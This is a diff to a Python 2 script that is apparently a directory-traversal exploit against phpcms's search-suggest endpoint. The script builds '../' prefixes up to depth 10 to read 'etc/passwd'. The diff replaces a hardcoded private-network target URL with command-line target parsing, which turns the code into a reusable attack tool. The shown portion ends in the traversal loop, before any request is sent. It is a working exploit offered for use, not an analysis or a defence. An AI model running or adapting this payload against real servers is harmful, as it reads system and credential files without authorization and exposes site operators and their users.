@@ -1,13 +1,34 @@
+import sys
 import urllib2
+import getopt
 import time
 
-target = 'http://192.168.11.41/phpcms/phpcms/index.php?m=search&c=index&a=public_get_suggest_keyword&url=ASDF&q='
+target = ''
 depth = 10
 file = 'etc/passwd'
 
 html = ''
 prefix = ''
 url = ''
+
+def usage():
+		print "usage function"
+
+
+try:
+		opts,args = getopt.getopt(sys.argv[1:],"ht:",["help","target="])
+		for opt, arg in opts:
+			if opt in("-h","--help"):
+				usage()
+				sys.exit()
+			if opt in("-t","--target"):
+				target = arg
+				if not target.startswith('http://', 0, 7): 
+						target = 'http://' + target
+except getopt.GetoptError:
+		usage()
+		sys.exit(2)
+
 
 for i in range(1,depth+1):
 		prefix += '../'
